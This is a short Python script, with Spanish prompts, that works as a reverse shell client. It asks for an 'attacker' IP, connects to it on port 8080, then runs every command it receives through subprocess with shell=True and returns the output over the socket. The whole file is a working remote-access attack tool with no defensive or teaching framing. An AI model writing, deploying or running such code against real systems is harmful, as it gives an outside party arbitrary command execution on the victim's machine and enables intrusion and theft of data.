import socket
import subprocess

ATTACKER_IP = input("Ingresa IP del dispositivo atacante")
PORT = 8080

def main():
    s = socket.socket()
    s.connect((ATTACKER_IP, PORT))

    s.send("1".encode("ascii"))

    while True:
        comando = s.recv(1024).decode("utf-8", errors="replace").strip()

        if not comando or comando.lower() == "exit":
            break

        try:
            salida = subprocess.run(
                comando, shell=True, capture_output=True, timeout=30
            )
            resultado = salida.stdout + salida.stderr
            if not resultado:
                resultado = b"(sin salida)\n"
        except Exception as e:
            resultado = str(e).encode()

        s.send(resultado[:4096])

    s.close()

if __name__ == "__main__":
    main()
